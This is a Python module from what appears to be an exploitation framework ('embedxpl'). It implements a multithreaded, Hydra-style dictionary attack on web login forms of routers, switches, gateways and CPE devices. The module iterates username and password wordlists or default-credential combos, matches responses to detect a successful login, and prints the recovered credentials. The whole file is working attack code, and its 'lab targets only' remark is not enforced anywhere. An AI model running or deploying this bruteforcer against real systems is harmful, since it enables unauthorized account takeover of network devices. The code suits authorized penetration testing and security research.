"""HTTP(S) web login bruteforce with configurable success/failure matchers (Hydra-style).

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""

from __future__ import annotations

import itertools
import time
from typing import Dict, Iterator, Optional, Set, Tuple
from urllib.parse import parse_qsl

import requests

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient
from embedxpl.resources import wordlists


def _parse_status_codes(raw: str) -> Optional[Set[int]]:
    """Parse comma-separated HTTP status codes into a set.

    Args:
        raw: String like ``"200,302"`` or empty.

    Returns:
        Set of integers, or ``None`` if ``raw`` is empty/whitespace.
    """
    text = (raw or "").strip()
    if not text:
        return None
    out: Set[int] = set()
    for part in text.split(","):
        part = part.strip()
        if part:
            out.add(int(part))
    return out


class Exploit(HTTPClient):
    """Bruteforce web login forms using wordlists and explicit response rules."""

    __info__ = {
        "name": "HTTP Web Form Bruteforce (Hydra-style)",
        "description": "Dictionary attack against HTTP/HTTPS login forms. Set failure/success "
        "body substrings, status codes, or Location fragments—similar to Hydra/JtR web modules. "
        "Respect rate limits and authorization; for lab targets only.",
        "authors": (
            "André Henrique <https://github.com/mrhenrike>",
        ),
        "devices": (
            "Routers",
            "Switches",
            "Gateways",
            "CPE",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP/HTTPS port")
    ssl = OptBool(False, "Use HTTPS (TLS)")

    threads = OptInteger(8, "Number of threads")
    login_path = OptString("/login.cgi", "Path for login request (form action)")
    http_method = OptString("POST", "HTTP method: POST or GET")

    user_field = OptString("username", "Form field name for username")
    pass_field = OptString("password", "Form field name for password")
    extra_fields = OptString(
        "",
        "Extra static fields as query string: key=value&key2=value2",
    )
    extra_headers = OptString(
        "",
        "Extra headers, one per line: Header-Name: value",
    )
    body_format = OptString("form", "Payload: form (application/x-www-form-urlencoded) or json")
    user_agent = OptString(
        "",
        "Optional User-Agent (empty = requests default)",
    )

    combo_mode = OptBool(
        False,
        "If true, use combos wordlist (user:pass per line) instead of usernames×passwords",
    )
    usernames = OptWordlist(
        wordlists.usernames,
        "Usernames (comma list or file://) when combo_mode is false",
    )
    passwords = OptWordlist(
        wordlists.passwords,
        "Passwords (comma list or file://) when combo_mode is false",
    )
    combos = OptWordlist(
        wordlists.defaults,
        "user:pass lines (comma or file://) when combo_mode is true",
    )

    failure_status_codes = OptString(
        "401,403",
        "Always treat these HTTP codes as failure (empty disables)",
    )
    success_status_codes = OptString(
        "",
        "If set, these codes alone can indicate success (after failure rules)",
    )
    failure_body_contains = OptString(
        "",
        "Substring in body marking failed login (Hydra-style F= / invalid creds page)",
    )
    success_body_contains = OptString(
        "",
        "Substring in body marking success (Hydra-style S=)",
    )
    success_location_contains = OptString(
        "",
        "Substring that must appear in Location header (e.g. index.html after 302)",
    )

    follow_redirects = OptBool(True, "Follow HTTP redirects (passes allow_redirects to requests)")
    weak_success_heuristic = OptBool(
        False,
        "If no explicit success rule matches, treat 2xx/3xx (minus failure codes) as success",
    )
    delay_seconds = OptFloat(0.0, "Per-attempt delay in each worker thread (rate limiting)")
    max_body_chars = OptInteger(
        500000,
        "Max response body length to scan for substring/Location heuristics",
    )

    stop_on_success = OptBool(True, "Stop all workers after first matching credentials")
    verbosity = OptBool(True, "Print each attempt result")

    def run(self) -> None:
        """Entry point: reset credentials and launch attack."""
        self.credentials = []
        self.attack()

    def _static_field_dict(self) -> Dict[str, str]:
        """Parse ``extra_fields`` into a dictionary."""
        raw = (self.extra_fields or "").strip()
        if not raw:
            return {}
        return dict(parse_qsl(raw, keep_blank_values=True))

    def _extra_header_dict(self) -> Dict[str, str]:
        """Parse ``extra_headers`` into a header dict."""
        raw = (self.extra_headers or "").strip()
        if not raw:
            return {}
        out: Dict[str, str] = {}
        for line in raw.splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            name, value = line.split(":", 1)
            name = name.strip()
            if name:
                out[name] = value.strip()
        return out

    def _failure_codes(self) -> Set[int]:
        """Resolved failure HTTP status codes."""
        parsed = _parse_status_codes(self.failure_status_codes)
        return parsed if parsed is not None else set()

    def _success_codes(self) -> Optional[Set[int]]:
        """Resolved success HTTP status codes, if user configured any."""
        return _parse_status_codes(self.success_status_codes)

    def _rules_configured(self) -> bool:
        """Return True if at least one strong matcher or weak heuristic is enabled."""
        if self.weak_success_heuristic:
            return True
        if (self.failure_body_contains or "").strip():
            return True
        if (self.success_body_contains or "").strip():
            return True
        if (self.success_location_contains or "").strip():
            return True
        if _parse_status_codes(self.success_status_codes) is not None:
            return True
        return False

    def _response_sample(self, response: requests.Response) -> Tuple[str, str]:
        """Return truncated body and Location header for matching."""
        text = response.text or ""
        limit = int(self.max_body_chars)
        if limit > 0 and len(text) > limit:
            text = text[:limit]
        loc = (
            response.headers.get("Location")
            or response.headers.get("location")
            or ""
        )
        return text, loc

    def credentials_match(self, response: Optional[requests.Response]) -> bool:
        """Decide if HTTP response indicates valid credentials.

        Args:
            response: ``requests.Response`` or ``None`` on transport error.

        Returns:
            True if the attempt should be treated as successful.
        """
        if response is None:
            return False

        status = response.status_code
        if status in self._failure_codes():
            return False

        body, location = self._response_sample(response)
        fail_sub = (self.failure_body_contains or "").strip()
        if fail_sub and fail_sub in body:
            return False

        succ_sub = (self.success_body_contains or "").strip()
        if succ_sub:
            return succ_sub in body

        loc_sub = (self.success_location_contains or "").strip()
        if loc_sub:
            return loc_sub in location

        succ_codes = self._success_codes()
        if succ_codes is not None:
            return status in succ_codes

        if fail_sub:
            return fail_sub not in body

        if self.weak_success_heuristic:
            return 200 <= status < 400

        return False

    def _build_payload(self, username: str, password: str) -> Dict[str, str]:
        """Merge static fields with credentials."""
        payload = dict(self._static_field_dict())
        payload[str(self.user_field)] = username
        payload[str(self.pass_field)] = password
        return payload

    def _issue_login(self, username: str, password: str) -> Optional[requests.Response]:
        """Send one login attempt."""
        payload = self._build_payload(username, password)
        method = (self.http_method or "POST").strip().upper()
        allow = bool(self.follow_redirects)
        headers: Dict[str, str] = {}
        if (self.user_agent or "").strip():
            headers["User-Agent"] = str(self.user_agent).strip()
        headers.update(self._extra_header_dict())
        fmt = (self.body_format or "form").strip().lower()

        if fmt == "json":
            if method == "GET":
                return self.http_request(
                    "GET",
                    self.login_path,
                    params=payload,
                    headers=headers or None,
                    allow_redirects=allow,
                )
            return self.http_request(
                method,
                self.login_path,
                json=payload,
                headers=headers or None,
                allow_redirects=allow,
            )

        if method == "GET":
            return self.http_request(
                "GET",
                self.login_path,
                params=payload,
                headers=headers or None,
                allow_redirects=allow,
            )

        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        return self.http_request(
            "POST",
            self.login_path,
            data=payload,
            headers=headers,
            allow_redirects=allow,
        )

    def _pair_iterator(self) -> Iterator[Tuple[str, str]]:
        """Yield (username, password) pairs according to combo_mode."""
        if self.combo_mode:
            for line in self.combos:
                line = str(line).strip()
                if not line or line.startswith("#"):
                    continue
                if ":" not in line:
                    continue
                user, pwd = line.split(":", 1)
                user, pwd = user.strip(), pwd.strip()
                if user and pwd:
                    yield user, pwd
            return
        users = [str(u).strip() for u in self.usernames if str(u).strip()]
        pwds = [str(p).strip() for p in self.passwords if str(p).strip()]
        yield from itertools.product(users, pwds)

    @multi
    def attack(self) -> None:
        """Run parallel bruteforce if target is reachable and options are valid."""
        if not self.check():
            return

        if not self._rules_configured():
            print_error(
                "Set failure_body_contains, success_body_contains, success_status_codes, "
                "success_location_contains, or enable weak_success_heuristic.",
                verbose=self.verbosity,
            )
            return

        pairs = list(self._pair_iterator())
        if not pairs:
            print_error("No username/password pairs to try (check wordlists).", verbose=self.verbosity)
            return

        print_status(
            "Starting HTTP form bruteforce — {} attempts, path={} method={}".format(
                len(pairs),
                self.login_path,
                (self.http_method or "POST").upper(),
            ),
            verbose=self.verbosity,
        )

        data = LockedIterator(iter(pairs))
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data) -> None:
        """Worker: pull pairs, sleep if configured, login, record success."""
        delay = float(self.delay_seconds)
        while running.is_set():
            try:
                username, password = data.next()
            except StopIteration:
                break

            response = self._issue_login(username, password)
            if self.credentials_match(response):
                self.credentials.append(
                    (self.target, self.port, self.target_protocol, username, password),
                )
                print_success(
                    "Login accepted — user='{}'".format(username),
                    verbose=self.verbosity,
                )
                if self.stop_on_success:
                    running.clear()
            else:
                print_error(
                    "Login rejected — user='{}'".format(username),
                    verbose=self.verbosity,
                )

            if delay > 0:
                time.sleep(delay)

    @mute
    def check(self) -> bool:
        """Return True if HTTP service answers (probe GET /)."""
        if self.http_test_connect():
            print_status("Target exposes HTTP/HTTPS service", verbose=self.verbosity)
            return True
        print_status("Target does not expose HTTP/HTTPS", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        """Internal API: return found credentials or None."""
        if not self.check():
            return None
        if not self._rules_configured():
            return None
        self.credentials = []
        pairs = list(self._pair_iterator())
        if not pairs:
            return None
        data = LockedIterator(iter(pairs))
        self.run_threads(self.threads, self.target_function, data)
        if self.credentials:
            return self.credentials
        return None